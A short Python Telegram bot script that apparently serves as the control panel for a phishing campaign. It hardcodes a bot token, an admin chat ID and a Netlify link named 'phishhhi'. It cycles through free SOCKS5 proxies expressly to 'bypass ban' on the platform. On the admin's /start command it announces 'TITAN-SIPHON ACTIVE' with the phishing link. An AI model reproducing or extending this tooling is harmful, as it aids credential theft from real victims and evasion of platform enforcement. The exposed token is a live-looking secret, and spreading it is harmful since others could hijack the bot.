import telebot
from telebot import apihelper
import requests

# --- CONFIG ---
TOKEN = '8085353942:AAH-r1yJqPGNvPruBICBW4aFAh2IPJjy_Qw'
ADMIN_ID = '6671784926'
NETLIFY_URL = "https://phishhhi.netlify.app"

# --- AUTO PROXY FINDER ---
def set_best_proxy():
    print("Finding working proxy to bypass ban...")
    try:
        # Fetching fresh SOCKS5 proxies
        response = requests.get("https://api.proxyscrape.com")
        proxies = response.text.split('\r\n')
        for proxy in proxies:
            if proxy:
                try:
                    apihelper.proxy = {'https': f'socks5://{proxy}'}
                    bot.get_me() # Test connection
                    print(f"✅ Connected via: {proxy}")
                    return True
                except:
                    continue
    except:
        print("❌ Failed to fetch proxies. Check your internet.")
    return False

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def welcome(message):
    if str(message.chat.id) == ADMIN_ID:
        msg = f"<b>🔥 v14.0 TITAN-SIPHON ACTIVE</b>\n\n🔗 Link: <code>{NETLIFY_URL}</code>"
        bot.send_message(message.chat.id, msg, parse_mode='HTML')

if __name__ == "__main__":
    if set_best_proxy():
        print("Gold Connection Established.")
        bot.polling()
    else:
        print("Could not bypass ban. Try a manual VPN.")
